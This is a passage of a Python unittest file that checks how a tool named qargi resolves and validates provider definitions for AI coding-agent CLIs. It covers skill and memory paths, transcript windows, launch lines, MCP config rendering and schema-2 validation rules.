        self.assertEqual([s["path"] for s in lay["settings_files"]], ["/h/me/.claude/settings.json", ".claude/settings.json", ".claude/settings.local.json"])
        self.assertEqual(lay["memory_dir"], "/h/me/.claude/projects/{checkout_key}/memory")
        self.assertEqual(CODE["resources"]["skills"]["user_dir"], "~/.claude/skills")        # the definition itself is not changed

    def test_the_accessor_defaults_the_home_to_the_environment(self):
        with mock.patch.dict(os.environ, {"HOME": "/env/home"}):
            self.assertEqual(P.layout("claude-code", root=self.root)["user_skills_dir"], "/env/home/.claude/skills")

    def test_require_returns_a_value_and_refuses_a_null_field_with_the_degrade_text(self):
        self.put("claude-code", self.without("resources", "skills", "project_dir"))
        self.assertEqual(P.require("claude-code", "user_skills_dir", "x", root=self.root, home="/h"), "/h/.claude/skills")
        with self.assertRaises(P.Unsupported) as cm:
            P.require("claude-code", "project_skills_dir", "link the checkout's skills directory to the render", root=self.root)
        self.assertEqual(str(cm.exception), "provider claude-code has no project skills directory: link the checkout's skills directory to the render")
        self.assertIsInstance(cm.exception, P.ProviderError)

    def test_require_skills_wants_a_verified_skills_capability(self):
        P.require_skills("claude-code", "audit", root=self.root)
        d = descriptor()
        d["capabilities"]["skills"]["verified_on"] = None
        self.put("claude-code", d)
        with self.assertRaises(P.Unsupported) as cm:
            P.require_skills("claude-code", "audit the skills a session loads", root=self.root)
        self.assertEqual(str(cm.exception), "provider claude-code has no skills support on the local surface: audit the skills a session loads")
        d["capabilities"]["skills"].update(value="no", verified_on="2026-10-31")
        self.put("claude-code", d)
        with self.assertRaises(P.Unsupported):
            P.require_skills("claude-code", "x", root=self.root)

    def test_checkout_key_replaces_every_non_alphanumeric(self):
        self.assertEqual(P.checkout_key("nonalnum-dash", "/home/me/My Proj.x/a_b"), "-home-me-My-Proj-x-a-b")
        with self.assertRaises(P.ProviderError):
            P.checkout_key("rot13", "/x")

    def test_memory_dir_is_the_template_with_the_key_filled_in(self):
        self.assertEqual(P.memory_dir("claude-code", "/home/me/p.q", root=self.root, home="/h"), "/h/.claude/projects/-home-me-p-q/memory")
        self.put("claude-code", self.without("resources", "memory"))
        with self.assertRaises(P.Unsupported):
            P.memory_dir("claude-code", "/x", root=self.root)

    def test_transcripts_is_the_directory_with_the_key_filled_in_and_the_reading_rule(self):
        tr = P.transcripts("claude-code", "/home/me/p.q", root=self.root, home="/h")
        self.assertEqual(tr["dir"], "/h/.claude/projects/-home-me-p-q")
        self.assertEqual((tr["ext"], tr["window"]), (".jsonl", 200000))
        self.assertEqual(tr["usage"]["tokens"], "/message/usage")
        self.assertEqual(tr["usage"]["fields"], ["input_tokens", "cache_read_input_tokens", "cache_creation_input_tokens"])
        d = self.without("resources", "transcripts", "window")
        self.put("claude-code", d)
        self.assertEqual(P.transcripts("claude-code", "/x", root=self.root, home="/h")["window"], P.TRANSCRIPT_WINDOW)
        self.put("claude-code", self.without("resources", "transcripts", "windows"))
        self.assertEqual(P.transcripts("claude-code", "/x", root=self.root, home="/h")["windows"], [])
        self.put("claude-code", self.without("resources", "transcripts"))
        with self.assertRaises(P.Unsupported) as cm:
            P.transcripts("claude-code", "/x", root=self.root)
        self.assertIn("has no session transcripts location", str(cm.exception))

    def test_the_window_of_a_model_comes_from_the_windows_table_else_it_is_assumed(self):
        tr = P.transcripts("claude-code", "/x", root=self.root, home="/h")
        for model, want in (("claude-x[1m]", (1000000, "model")), ("claude-x-1M", (1000000, "model")), ("claude-x", (200000, "assumed")),
                            ("claude-x[1m]-y", (200000, "assumed")), ("", (200000, "assumed"))):
            self.assertEqual(P.transcript_window(tr, model), want, model)
        tr = {"window": 200000, "windows": [("big-*", 500000), ("*-small", 100000), ("big-small", 1)]}      # the first match wins; * is the only wildcard
        self.assertEqual(P.transcript_window(tr, "big-small"), (500000, "model"))
        self.assertEqual(P.transcript_window(tr, "x-small"), (100000, "model"))
        self.assertEqual(P.transcript_window(tr, "bigger"), (200000, "assumed"))
        self.assertEqual(P.transcript_window({"window": 7}, "m"), (7, "assumed"))

    def test_the_launch_line_keeps_an_optional_group_only_when_its_file_exists(self):
        render = os.path.join(self.tmp, "render")
        os.makedirs(render)
        self.assertEqual(P.launch_line("claude-code", render, root=self.root), "claude --add-dir %s" % render)
        for f in ("mcp.json", "settings.json"):
            with open(os.path.join(render, f), "w") as fh:
                fh.write("{}")
        self.assertEqual(P.launch_line("claude-code", render, root=self.root),
                         "claude --add-dir %s --mcp-config %s/mcp.json --settings %s/settings.json" % (render, render, render))
        self.put("claude-code", self.without("session", "launch"))
        with self.assertRaises(P.Unsupported):
            P.launch_line("claude-code", render, root=self.root)

    def test_project_provider_is_models_provider_and_has_no_default(self):
        self.assertEqual(P.project_provider({"models": {"provider": "other"}}, "p"), "other")
        msg = "project p has no provider: set one with qargi project set p models.provider NAME"
        for answers in ({}, None, {"models": {}}, {"models": {"provider": ""}}, {"models": {"provider": "  "}}, {"models": {"provider": 3}}):
            with self.assertRaises(P.NoProvider) as cm:
                P.project_provider(answers, "p")
            self.assertEqual(str(cm.exception), msg)
            self.assertIsInstance(cm.exception, P.ProviderError)


class LayoutCli(CliBase):
    def test_layout_prints_json_or_one_field(self):
        rc, out, _ = self.run_cli("layout", "claude-code", "--home", "/h")
        self.assertEqual(rc, 0)
        self.assertEqual(json.loads(out)["user_skills_dir"], "/h/.claude/skills")
        rc, out, _ = self.run_cli("layout", "claude-code", "project_skills_dir")
        self.assertEqual((rc, out), (0, ".claude/skills\n"))
        rc, out, _ = self.run_cli("layout", "claude-code", "exclusion")
        self.assertEqual(json.loads(out), {"file_key": "skillOverrides", "off_value": "off"})

    def test_a_null_field_exits_3_with_the_degrade_text(self):
        d = descriptor()
        del d["resources"]["skills"]["project_dir"]
        self.put("claude-code", d)
        rc, out, err = self.run_cli("layout", "claude-code", "project_skills_dir", "--would", "link the skills")
        self.assertEqual((rc, out), (3, ""))
        self.assertEqual(err, "qargi: provider claude-code has no project skills directory: link the skills\n")

    def test_check_lists_a_missing_layout_facility_among_the_degrades(self):
        rc, out, _ = self.run_cli("check", "claude-code")
        self.assertNotIn("layout:", out)
        d = descriptor()
        del d["session"]["launch"]
        self.put("claude-code", d)
        rc, out, _ = self.run_cli("check", "claude-code")
        self.assertEqual(rc, 0)
        self.assertRegex(out, r"layout: session_launch\s+no \(")

    def test_of_prints_the_provider_of_a_project_and_refuses_one_with_none_with_exit_2(self):
        conf = os.path.join(self.tmp, "conf")
        os.makedirs(os.path.join(conf, "projects"))
        for name, answers in (("withp", {"models": {"provider": "claude"}}), ("nop", {"models": {}}), ("badp", {"models": {"provider": "nope"}})):
            with open(os.path.join(conf, "projects", name + ".json"), "w") as f:
                json.dump(answers, f)
        self.assertEqual(self.run_cli("of", "withp", "--conf", conf)[:2], (0, "claude\n"))
        rc, out, err = self.run_cli("of", "nop", "--conf", conf)
        self.assertEqual((rc, out, err), (2, "", "qargi: project nop has no provider: set one with qargi project set nop models.provider NAME\n"))
        self.assertEqual(self.run_cli("of", "absent", "--conf", conf)[0], 2)
        self.assertEqual(self.run_cli("of", "badp", "--conf", conf)[:2], (0, "nope\n"))
        self.assertEqual(self.run_cli("layout", "nope")[0], 1)

    def test_an_unknown_field_or_provider_is_not_exit_3(self):
        self.assertEqual(self.run_cli("layout", "claude-code", "nope")[0], 2)
        self.assertEqual(self.run_cli("layout", "nope")[0], 1)

    def test_require_skills_and_launch(self):
        self.assertEqual(self.run_cli("require-skills", "claude-code")[0], 0)
        rc, out, _ = self.run_cli("launch", "claude-code", self.tmp)
        self.assertEqual((rc, out), (0, "claude --add-dir %s\n" % self.tmp))
        d = descriptor()
        d["capabilities"]["skills"]["value"] = "no"
        self.put("claude-code", d)
        rc, _, err = self.run_cli("require-skills", "claude-code", "--would", "audit")
        self.assertEqual(rc, 3)
        self.assertIn("provider claude-code has no skills support on the local surface: audit", err)


# ---- the schema: runtimes, catalogs, the loader --------------------------------------------------------------------------

def tier(model, alias=None, verified_on=None):
    return {"model": model, "alias": alias, "verified_on": verified_on, "source": "test"}


def runtime(name="mylocal", **over):
    """The smallest schema 2 runtime: one model for every tier, no effort control, run as a command."""
    d = {"schema": 2, "kind": "provider", "provider": name, "family": None, "surface": "local",
         "models": {"pattern": "^.+$", "tiers": {"*": tier("my-model")}, "effort": None},
         "dispatch": {"mode": "command", "argv": [name, "run", "--model", "{model}"], "prompt": {"via": "stdin"}, "cwd": "{clone}",
                      "output": {"format": "text"}},
         "agents": None, "resources": {}, "barrier": {"kind": "none"}}
    d.update(over)
    return d


def catalog(family="fam", **over):
    d = {"schema": 2, "kind": "catalog", "family": family, "version": "2026-11-02", "pattern": "^fam-[a-z0-9.-]+$",
         "tiers": {"fast": tier("fam-small", "small"), "balanced": tier("fam-mid", "mid"), "deep": tier("fam-big", "big"),
                   "frontier": tier("fam-top", None)},
         "effort": {"low": "low", "medium": "medium", "high": "high", "xhigh": None, "max": None}}
    d.update(over)
    return d


def cell(value="yes", verified_on="2026-11-02", note="n"):
    return {"value": value, "verified_on": verified_on, "source": "test", "note": note}


class Schema2(unittest.TestCase):
    """validate2() of a document: the node of schema-2.json for its kind, and the rules a schema cannot say."""

    def one(self, d, needle, name=None):
        f = fails(d, name or d.get("provider") or d.get("family"))
        self.assertTrue(any(needle in m for m in f), "%r not in %r" % (needle, f))
        return f

    def test_the_smallest_runtime_is_valid_and_clean(self):
        self.assertEqual(P.validate2(runtime(), "mylocal"), [])

    def test_a_catalog_is_valid_and_a_runtime_may_reference_it(self):
        self.assertEqual(P.validate2(catalog(), "fam"), [])
        d = runtime("fam-cli", family="fam", models={"catalog": "fam", "use": "alias"})
        self.assertEqual(fails(d, "fam-cli"), [])

    def test_a_full_cloud_or_local_runtime_with_resources_is_valid(self):
        res = {"skills": {"project_dir": ".fake/skills", "user_dir": "~/.fake/skills", "items": "dir-per-item", "entry": "SKILL.md",
                          "format": "skill-md", "link": {"project": "dir-symlink", "user": "entry-symlinks"},
                          "exclusion": {"form": "config-list", "file": "~/.fake/config.toml", "format": "toml", "pointer": "/skills/config",
                                        "match": {"name": "{name}"}, "off": {"enabled": False}}},
               "agents": {"project_dir": ".fake/agents", "user_dir": "~/.fake/agents", "items": "file-per-item", "ext": ".toml"},
               "instructions": {"project_file": ["AGENTS.md"], "items": "single-file"},
               "mcp": {"file": ".fake/mcp.json", "format": "json", "root_pointer": "/servers", "entry": {"command": "{command}"}, "permission_rule": None},
               "settings": {"files": [{"scope": "user", "path": "~/.fake/settings.json", "format": "json"}, {"scope": "project", "path": ".fake/settings.json"}],
                            "allow_pointer": "/allow"},
               "memory": {"user_dir": "~/.fake/mem/{checkout_key}", "checkout_key": "sha256-16", "link": {"user": "dir-symlink"}}}
        d = runtime("fakecli", resources=res, agents={"reserved_names": ["plan"], "tools": {"shell": "sh"}},
                    capabilities={"skills": cell(), "headless_dispatch": cell("partial")}, session={"launch": "fake --dir {render}", "render_target": "fakecli"},
                    adapter="adapter", adapter_verbs=["self-test"], barrier={"kind": "hook", "hook": {"input": "json-stdin"}})
        self.assertEqual(fails(d, "fakecli"), [])

    def test_an_unknown_or_unbuilt_kind_is_refused(self):
        self.one(runtime(kind="widget"), "kind: 'widget' is not one of provider, catalog, extension")
        self.one(runtime(kind="extension"), "extends: null is not a runtime or family name")      # an extension is a pack kind; it has its own rules (validate_extension)
        d = runtime()
        del d["kind"]
        self.one(d, "missing required property 'kind'")

    def test_the_basic_violations(self):
        self.one(runtime(extra=1), "extra: additional property is not allowed")
        self.one(runtime(provider="Bad_Name"), "provider: 'Bad_Name' does not match")
        self.one(runtime("other"), "provider 'other' differs from the file name 'mylocal'", "mylocal")
        self.one(runtime(surface="both"), "surface: 'both' is not one of local, cloud")
        self.one(runtime(family="Bad"), "family: 'Bad' does not match")
        d = runtime()
        del d["models"]
        self.one(d, "missing required property 'models'")

    def test_models_take_the_catalog_form_or_the_inline_form_not_both(self):
        self.one(runtime(models={"catalog": "fam"}), "models: a catalog reference needs use (alias or id)")
        both = {"catalog": "fam", "use": "id", "pattern": "^.+$", "tiers": {"*": tier("m")}, "effort": None}
        self.one(runtime(models=both), "models: a catalog reference and inline models are two forms; give one")
        self.one(runtime(models={}), "models: needs a catalog reference or inline models (pattern and tiers)")
        self.one(runtime(models={"pattern": "^.+$"}), "models: inline models need tiers")
        self.one(runtime(models={"tiers": {"*": tier("m")}}), "models: inline models need pattern")

    def test_every_tier_must_resolve_and_match_the_pattern(self):
        m = {"pattern": "^m-.*$", "tiers": {"fast": tier("m-a"), "deep": tier("m-b")}, "effort": None}
        self.one(runtime(models=m), "models.tiers: tier 'balanced' resolves to no model (give it or '*')")
        m["tiers"]["*"] = tier("m-c")
        self.assertEqual(fails(runtime(models=m), "mylocal"), [])
        m["tiers"]["*"] = tier("zzz")
        self.one(runtime(models=m), "models.tiers.*.model: 'zzz' does not match pattern ^m-.*$")
        self.one(runtime(models={"pattern": "([", "tiers": {"*": tier("m")}, "effort": None}), "models.pattern: not a regular expression")

    def test_a_catalog_is_checked_like_inline_models(self):
        c = catalog()
        c["tiers"]["fast"]["model"] = "other-small"
        self.one(c, "tiers.fast.model: 'other-small' does not match pattern", "fam")
        del c["tiers"]["balanced"]
        self.one(c, "tiers: tier 'balanced' resolves to no model", "fam")
        self.one(catalog("other"), "family 'other' differs from the file name 'fam'", "fam")
        self.one(catalog(version="02/11/2026"), "version: '02/11/2026' is not a date", "fam")

    def test_capability_cells_are_flat_and_unverified_ones_warn(self):
        d = runtime(capabilities={"skills": cell(), "mcp": cell("yes", None), "resume": {"value": "yes"}})
        self.assertEqual(fails(d, "mylocal"), [])
        w = warns(d, "mylocal")
        self.assertEqual(sorted(m.split(":")[0] for m in w), ["capabilities.mcp.verified_on", "capabilities.resume.verified_on"])
        self.assertTrue(all("counts as not supported" in m for m in w))
        self.one(runtime(capabilities={"teleport": cell()}), "capabilities.teleport: unknown capability")
        self.one(runtime(capabilities={"skills": {"value": "maybe"}}), "capabilities.skills.value: 'maybe' is not one of yes, partial, no")
        self.one(runtime(capabilities={"skills": {"local": cell()}}), "capabilities.skills.local: additional property is not allowed")
        self.assertEqual(warns(runtime(capabilities={"skills": {"value": "no"}}), "mylocal"), [])

    def test_resource_paths_stay_inside_the_checkout_or_the_home(self):
        def bad(res, needle):
            self.one(runtime(resources=res), needle)
        bad({"skills": {"project_dir": "../out"}}, "resources.skills.project_dir: '../out' is not a path inside the checkout")
        bad({"skills": {"project_dir": "/abs"}}, "resources.skills.project_dir: '/abs' is not a path inside the checkout")
        bad({"agents": {"user_dir": "rel/dir"}}, "resources.agents.user_dir: 'rel/dir' does not start with ~/")
        bad({"settings": {"files": [{"scope": "user", "path": "rel"}]}}, "resources.settings.files[0].path: the user file 'rel' does not start with ~/")
        bad({"settings": {"files": [{"scope": "project", "path": "~/x"}]}}, "resources.settings.files[0].path: '~/x' is not a path inside the checkout")
        bad({"memory": {"user_dir": "/m"}}, "resources.memory.user_dir: '/m' does not start with ~/")
        bad({"memory": {"user_dir": "~/m/{checkout_key}", "checkout_key": None}}, "resources.memory.user_dir: uses {checkout_key} but checkout_key is null")
        bad({"transcripts": {"user_dir": "/t"}}, "resources.transcripts.user_dir: '/t' does not start with ~/")
        bad({"transcripts": {"user_dir": "~/t/{checkout_key}", "checkout_key": None}}, "resources.transcripts.user_dir: uses {checkout_key} but checkout_key is null")
        bad({"transcripts": {"user_dir": "~/t", "window": 5}}, "resources.transcripts.window: 5 is not a number of tokens")
        bad({"transcripts": {"user_dir": "~/t", "windows": [{"model": "m", "tokens": 5}]}}, "resources.transcripts.windows[0].tokens: 5 is not a number of tokens")
        bad({"transcripts": {"user_dir": "~/t", "windows": [{"model": "m" * 81, "tokens": 5000}]}}, "resources.transcripts.windows[0].model:")
        bad({"transcripts": {"user_dir": "~/t", "windows": [{"model": "m", "tokens": 5000}] * 33}}, "33 entries are more than the 32")
        bad({"transcripts": {"user_dir": "~/t", "usage": {"select": {"type": "assistant"}}}}, "resources.transcripts.usage.select: 'type' is not a JSON pointer")
        bad({"transcripts": {"user_dir": "~/t", "usage": {"tokens": "usage"}}}, "resources.transcripts.usage.tokens: 'usage' is not a JSON pointer")
        bad({"mcp": {"file": "../x.json"}}, "resources.mcp.file: '../x.json' is not a path inside the checkout")

    def test_the_tool_lists_of_an_mcp_entry_are_pointers_the_renderer_can_write(self):
        """resources.mcp.tool_lists (the tools of a server held in its own entry) and a TOML file's entry template: what the renderer can write, said
        by provider check before a render is tried."""
        good = {"file": "c.toml", "format": "toml", "root_pointer": "/servers", "entry": {"url": "{url}", "opts": {"timeout": 30, "on": True}},
                "permission_rule": "mcp__{server}__{tool}", "name_key": "nonword-underscore", "tool_lists": {"allow": "/enabled_tools", "deny": "/opts/off"}}
        self.assertEqual(fails(runtime(resources={"mcp": good}), "mylocal"), [])

        def bad(change, needle):
            self.one(runtime(resources={"mcp": dict(good, **change)}), needle, name="mylocal")
        bad({"tool_lists": {}}, "resources.mcp.tool_lists: names neither an allow nor a deny list")
        bad({"tool_lists": {"allow": "enabled_tools"}}, "resources.mcp.tool_lists.allow: 'enabled_tools' is not a JSON pointer into the entry")
        bad({"tool_lists": {"allow": "/url"}}, "resources.mcp.tool_lists.allow: /url runs onto or through a value the entry template sets")
        bad({"tool_lists": {"deny": "/url/x"}}, "resources.mcp.tool_lists.deny: /url/x runs onto or through a value the entry template sets")
        bad({"tool_lists": {"allow": "/t", "deny": "/t"}}, "resources.mcp.tool_lists: allow and deny are the same place (/t)")
        bad({"tool_lists": {"allow": "/t", "list": "/u"}}, "resources.mcp.tool_lists.list: additional property is not allowed")
        bad({"permission_rule": None}, "resources.mcp.tool_lists: needs a permission_rule with {server} and {tool}")
        bad({"permission_rule": "{server}"}, "resources.mcp.tool_lists: needs a permission_rule with {server} and {tool}")
        bad({"entry": {"url": "{url}", "timeout": 1.5}}, "resources.mcp.entry.timeout: 1.5 cannot be written as TOML by the renderer")
        bad({"entry": {"url": "{url}", "args": [1, 2]}}, "resources.mcp.entry.args: [1, 2] cannot be written as TOML by the renderer")
        bad({"root_pointer": "servers"}, "resources.mcp.root_pointer: 'servers' is not a JSON pointer")
        self.assertEqual(fails(runtime(resources={"mcp": dict(good, format="json", entry={"url": "{url}", "timeout": 1.5})}), "mylocal"), [])   # JSON holds a number
        self.assertEqual(fails(runtime(resources={"mcp": dict(good, tool_lists=None)}), "mylocal"), [])

    def test_the_mcp_file_of_a_run_needs_a_command_runtime_a_place_and_tool_lists(self):
        mcp = {"file": "c.toml", "format": "toml", "root_pointer": "/servers", "entry": {"url": "{url}"}, "permission_rule": "mcp__{server}__{tool}",
               "tool_lists": {"allow": "/enabled_tools"}}
        home = {"env": "MY_HOME", "dir": ".my", "link": [{"from": "~/.my/auth.json", "to": "auth.json"}]}

        def d(rc, **over):
            r = runtime(resources={"mcp": over.pop("mcp", mcp)})
            r["dispatch"].update(dict({"run_config": rc}, **over))
            return r
        self.assertEqual(fails(d({"in": "run", "file": "mcp.toml"}), "mylocal"), [])
        self.assertEqual(fails(d({"in": "home", "file": "config.toml"}, home=home), "mylocal"), [])
        self.assertEqual(fails(d(None), "mylocal"), [])

        def bad(r, needle):
            self.one(r, needle, name="mylocal")
        bad(d({"in": "home", "file": "config.toml"}), "dispatch.run_config.in: home needs dispatch.home")
        bad(d({"in": "home", "file": "auth.json"}, home=home), "dispatch.run_config.file: 'auth.json' is also a link of the run home")
        bad(d({"in": "run", "file": "m.toml"}, mcp=dict(mcp, tool_lists=None)), "dispatch.run_config: needs resources.mcp with tool_lists")
        bad(d({"in": "run", "file": "m.toml"}, mcp=None), "dispatch.run_config: needs resources.mcp with tool_lists")
        bad(d({"in": "run", "file": "../m.toml"}), "dispatch.run_config.file: '../m.toml' does not match ^")
        bad(d({"in": "elsewhere", "file": "m.toml"}), "dispatch.run_config.in: 'elsewhere' is not one of home, run")
        bad(d({"in": "run", "file": "m.toml", "x": 1}), "dispatch.run_config.x: additional property is not allowed")
        bad(d({"in": "run", "file": "m.toml"}, mode="in-session"), "dispatch.run_config: only a runtime that qargi local run starts")
        self.assertEqual(P.run_config_problems({"mode": "command", "run_config": {"in": "run", "file": "a/b"}}, {"mcp": mcp}),
                         ["dispatch.run_config.file: 'a/b' is not a plain file name (letters, digits, . _ and -, no /)"])

    def test_the_baseline_of_a_run_file_is_settings_the_writer_takes_and_leaves_the_servers_to_the_packs(self):
        mcp = {"file": "c.toml", "format": "toml", "root_pointer": "/servers", "entry": {"url": "{url}"}, "permission_rule": "mcp__{server}__{tool}",
               "tool_lists": {"allow": "/enabled_tools"}}

        def d(base, root="/servers"):
            r = runtime(resources={"mcp": dict(mcp, root_pointer=root)})
            r["dispatch"]["run_config"] = {"in": "run", "file": "c.toml", "baseline": base}
            return r
        good = {"ask": "never", "net": {"on": False, "roots": ["a"], "n": 3}}
        self.assertEqual(fails(d(good), "mylocal"), [])
        self.assertEqual(fails(d(None), "mylocal"), [])
        self.assertEqual(fails(d({"a": {"other": 1}}, root="/a/servers"), "mylocal"), [])          # beside the servers, under the same table
        self.one(d({}), "dispatch.run_config.baseline: {} is not a non-empty object of settings", name="mylocal")
        self.one(d(["ask"]), 'dispatch.run_config.baseline: ["ask"] is not a non-empty object of settings', name="mylocal")
        self.one(d({"x": {}}), "dispatch.run_config.baseline: baseline.x is an empty object, which sets nothing", name="mylocal")
        self.one(d({"x": 1.5}), "dispatch.run_config.baseline.x: 1.5 cannot be written as TOML by the renderer", name="mylocal")
        self.one(d({"x": [1, 2]}), "dispatch.run_config.baseline.x: [1, 2] cannot be written as TOML by the renderer", name="mylocal")
        self.one(d({"servers": {"mine": {"url": "https://example.net"}}}), "dispatch.run_config.baseline: it sets /servers, where the MCP servers of the run go",
                 name="mylocal")
        self.one(d({"a": {"servers": {}}}, root="/a/servers"), "dispatch.run_config.baseline: it sets /a/servers", name="mylocal")
        self.one(d({"a": "text"}, root="/a/servers"), "dispatch.run_config.baseline: it sets /a, where the MCP servers of the run go", name="mylocal")

    def test_an_exclusion_form_needs_the_keys_that_form_reads(self):
        def excl(e):
            return {"skills": {"project_dir": ".s", "exclusion": e}}
        self.one(runtime(resources=excl({"form": "settings-key", "pointer": "/o"})), "resources.skills.exclusion: form settings-key needs files, pointer, shape and off")
        self.one(runtime(resources=excl({"form": "config-list", "file": "~/c.toml"})), "resources.skills.exclusion: form config-list needs file, format, pointer, match and off")
        self.one(runtime(resources=excl({"form": "deny-list", "file": "~/c.json", "format": "json"})), "resources.skills.exclusion: form deny-list needs file, format and pointer")
        key = {"form": "settings-key", "files": ["user", "project"], "pointer": "/o", "shape": "map", "off": "off"}
        self.one(runtime(resources=excl(key)), "resources.skills.exclusion.files: scope 'user' is not among resources.settings.files")
        res = excl(key)
        res["settings"] = {"files": [{"scope": "user", "path": "~/s.json"}]}
        self.one(runtime(resources=res), "resources.skills.exclusion.files: scope 'project' is not among resources.settings.files")
        res["settings"]["files"].append({"scope": "project", "path": "s.json"})
        self.assertEqual(fails(runtime(resources=res), "mylocal"), [])
        for e in ({"form": "none"}, {"form": "adapter"}, None):
            self.assertEqual(fails(runtime(resources=excl(e)), "mylocal"), [])

    def test_the_adapter_is_a_path_inside_the_definitions_directory(self):
        for ad in ("/usr/bin/x", "../x", "a/../../x"):
            self.one(runtime(adapter=ad), "adapter: '%s' is not a path inside the definition's directory" % ad)
        for ad in ("adapter", "bin/adapter", None):
            self.assertEqual(fails(runtime(adapter=ad), "mylocal"), [])

    def test_contract_addenda_is_an_optional_list_of_relative_file_names_inside_the_definitions_directory(self):
        def res(v):
            return runtime(surface="cloud", resources={"contract_addenda": v})
        for ok in (["cloud-run.md"], ["a.md", "b.md"], ["sub/c.md"], []):
            self.assertEqual(P.validate2(res(ok), "mylocal"), [], ok)
        self.assertEqual(P.validate2(runtime(surface="cloud", resources={}), "mylocal"), [])
        self.one(res("cloud-run.md"), "resources.contract_addenda: 'cloud-run.md' is not of type array")
        self.one(res([7]), "resources.contract_addenda[0]: ")
        self.one(res(["a.md", "a.md"]), "resources.contract_addenda: has a duplicate item")
        for bad in ("", "/abs.md", "~/x.md", "../x.md", "a/../../x.md", "a//b.md", "./a.md", "a/", "."):
            self.one(res([bad]), "resources.contract_addenda[0]: '%s' is not a file inside the definition's directory" % bad)
        self.one(res(["a.md", "../x.md"]), "resources.contract_addenda[1]: '../x.md' is not a file inside the definition's directory")

    def test_an_extension_cannot_add_contract_addenda(self):
        ext = {"schema": 2, "kind": "extension", "extension": "addon", "extends": "mycloud", "provides": [],
               "adds": {"resources": {"contract_addenda": ["x.md"]}}}
        self.assertTrue(any("adds.resources.contract_addenda: an extension cannot add contract addenda" in m for lvl, m in P.validate2(ext, "addon") if lvl == "fail"),
                        P.validate2(ext, "addon"))

    def test_notes_is_an_optional_object_of_topic_names_to_one_line_texts(self):
        for ok in ({}, {"spawn": "Start a member with the Agent tool."}, {"a": "x", "b-2": "y", "z" * 32: "ü and 日本語 are text"},
                   {"t%d" % i: "x" for i in range(16)}, {"edge": "x" * 2000}):
            self.assertEqual(P.validate2(runtime(notes=ok), "mylocal"), [], list(ok)[:2])
        self.assertEqual(P.validate2(runtime(surface="cloud", notes={"cloud-spawn": "x"}), "mylocal"), [])
        self.one(runtime(notes=["spawn"]), 'notes: ["spawn"] is not of type object')
        self.one(runtime(notes="text"), "notes: 'text' is not of type object")

    def test_a_local_runtime_that_works_in_the_session_warns_when_it_has_no_spawn_note(self):
        in_session = {"mode": "in-session"}
        def warned(d):
            return [m for m in warns(d) if "spawn" in m]
        self.assertEqual(len(warned(runtime(dispatch=in_session))), 1)
        self.assertEqual(len(warned(runtime(dispatch=in_session, notes={"alpha": "x"}))), 1)
        self.assertEqual(fails(runtime(dispatch=in_session)), [])                              # a warning, never a failure
        self.assertEqual(warned(runtime(dispatch=in_session, notes={"spawn": "Start it."})), [])
        self.assertEqual(warned(runtime()), [])                                                 # a command runtime is started by qargi local run
        self.assertEqual(warned(runtime(surface="cloud", dispatch=in_session)), [])
        self.assertIn("spawn", warned(runtime(dispatch=in_session))[0])
        self.assertEqual(warned(CODE), [])                                                     # the shipped runtime has it

    def test_provider_notes_refuses_with_exit_2_what_it_cannot_read_and_exits_1_for_a_missing_topic(self):
        import contextlib, io
        def run(side_effect=None, ret=None, *args):
            err = io.StringIO()
            with mock.patch.object(P, "notes_of", side_effect=side_effect, return_value=ret), contextlib.redirect_stderr(err), contextlib.redirect_stdout(io.StringIO()):
                return P.main(["notes", *args, "--project", "p"]), err.getvalue()
        self.assertEqual(run(P.ProviderError("broken pack"), None, "spawn")[0], 2)
        self.assertEqual(run(P.Drift("changed"), None, "spawn")[0], 2)
        self.assertEqual(run(P.NoProvider("none"), None)[0], 2)
        self.assertEqual(run(None, ("r", {"alpha": "x"}), "gamma")[0], 1)
        self.assertEqual(run(None, ("r", {}), "gamma")[0], 1)
        self.assertEqual(run(None, ("r", {"alpha": "x"}), "alpha")[0], 0)
        self.assertIn("broken pack", run(P.ProviderError("broken pack"), None, "spawn")[1])

    def test_a_notes_topic_is_lower_case_letters_digits_and_dashes_of_at_most_32_characters(self):
        for bad in ("", "Spawn", "1st", "-a", "a_b", "a b", "a.b", "z" * 33, "spawn\u00e9"):
            self.one(runtime(notes={bad: "x"}), "notes: the topic name %s is not a name" % P._show(bad))

    def test_a_notes_text_is_a_string_of_at_most_2000_characters(self):
        self.one(runtime(notes={"spawn": 7}), "notes.spawn: 7 is not of type string")
        self.one(runtime(notes={"spawn": None}), "notes.spawn: null is not of type string")
        self.one(runtime(notes={"spawn": ""}), "notes.spawn: the text is empty")
        self.one(runtime(notes={"spawn": "x" * 2001}), "notes.spawn: the text is longer than 2000 characters")

    def test_a_notes_document_holds_at_most_16_topics(self):
        self.one(runtime(notes={"t%d" % i: "x" for i in range(17)}), "notes: 17 topics are more than the 16 a definition may hold")

    def test_a_notes_text_has_no_control_or_format_character(self):
        for ch in ("\x1b", "\u202e", "\n", "\t", "\x00", "\x7f", "\x85"):                  # the rule every string of a definition has: one line of plain text
            f = fails(runtime(notes={"spawn": "a%sb" % ch}), "mylocal")
            self.assertEqual(len(f), 1, (ch, f))
            self.assertIn("notes.spawn", f[0])
            self.assertNotIn(ch, f[0])
        for ch in ("\u200b", "\u2060", "\ufeff", "\u00ad", "\U000e0041", "\ue000", "\u0378"):  # the rest of the contract addenda rule: format, private-use, unassigned
            self.one(runtime(notes={"spawn": "a%sb" % ch}), "notes.spawn: the text is not plain text (no control, format, private-use or unassigned characters)")

    def test_an_extension_cannot_add_notes(self):
        ext = {"schema": 2, "kind": "extension", "extension": "addon", "extends": "mycloud", "provides": [], "adds": {"notes": {"spawn": "x"}}}
        f = [m for lvl, m in P.validate2(ext, "addon") if lvl == "fail"]
        self.assertEqual(f, ["adds.notes: an extension cannot add notes (only a runtime's own definition has them)"])

    def test_every_violation_is_reported_not_only_the_first(self):
        self.assertGreaterEqual(len(fails(runtime(extra=1, surface="x", family="Bad"), "mylocal")), 3)


class BarrierClaim(Tree):
    """A runtime that claims read_only_barrier but has no barrier (kind none, no read-only arguments in its dispatch) is a fail-open: a read-only
    run would be treated as held by a barrier that does not exist. The check fails it, naming the surface and the fix."""

    def claim(self, value="yes", surface="local", barrier=None, dispatch=None):
        d = runtime("claimant", surface=surface, capabilities={"read_only_barrier": cell(value)})
        d["barrier"] = barrier
        if dispatch is not None:
            d["dispatch"] = dispatch
        return d

    def problems(self, d):
        self.put("claimant", d)
        _, _, findings = P.findings_of("claimant", root=self.root)
        return [m for lvl, m in findings if lvl == "fail" and "read_only_barrier" in m]

    def test_a_yes_with_barrier_none_and_no_class_arguments_fails_and_names_the_surface_and_the_fix(self):
        for surface in ("local", "cloud"):
            with self.subTest(surface):
                msgs = self.problems(self.claim(surface=surface, barrier={"kind": "none"}))
